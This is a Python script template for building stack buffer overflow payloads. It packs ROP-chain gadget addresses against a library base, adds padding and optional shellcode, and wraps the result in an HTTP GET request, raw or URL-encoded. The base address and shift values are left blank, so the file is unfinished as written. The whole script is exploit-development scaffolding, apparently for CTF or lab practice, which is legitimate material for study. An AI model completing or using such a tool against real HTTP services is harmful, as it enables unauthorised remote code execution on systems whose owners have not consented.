#!env python
import struct
import sys
import argparse
from urllib.parse import quote_from_bytes

parser = argparse.ArgumentParser()
parser.add_argument('--human', help='print overflow string human readable', action='store_true', default=False)
parser.add_argument('--httpencode', help='HTTP encode overflow data (not pre_out() and post_out() data', action='store_true', default=False)
args = parser.parse_args()

# <I little endian unsigned integer
# adjust to your CPU arch
global fmt
fmt='<I'

# base address in the process memory of the library you want to use for your ROP chain
base=

# how many bytes should we shift? memory: [shift*"A"+data()+lib(),...]
shift=
shifter = [bytes(shift*'A','ascii'),'shifter']
shellcode = b''

def pre_out():
    print("GET ", end='')

def post_out():
    print(" HTTP/1.1\r\n\r\n\r\n", end='')

def data(data, cmt=''):
    return [struct.pack(fmt,data),cmt]

def lib(offset, cmt=''):
    return [struct.pack(fmt,base+offset),cmt]

def out(data):
    data = [d[0] for d in data]
    b = bytearray(b''.join(data))
    pre_out()
    sys.stdout.flush()
    if shellcode != '':
        for x in shellcode:
            b.append(x)
    if args.httpencode:
        b = quote_from_bytes(b)
        print(b, end='')
    if not args.httpencode:
        sys.stdout.buffer.write(b)
    sys.stdout.flush()
    post_out()
    sys.stdout.flush()

def out_human(data):
    pre_out()
    sys.stdout.flush()
    b = '['
    for d in data:
        b+='0x'+d[0].hex()+' = '+d[1]+'|'
    if shellcode != '':
        b += shellcode.hex()
    b += ']'
    print(b,end='')
    sys.stdout.flush()
    post_out()
    sys.stdout.flush()

if args.human:
    fmt = '>I'

overflow =  [
        shifter,
        #data(0x10101010, 'r1'),
        #lib(0x000d22d0,'PC'), 
        ]

if args.human:
    out_human(overflow)
else:
    out(overflow)
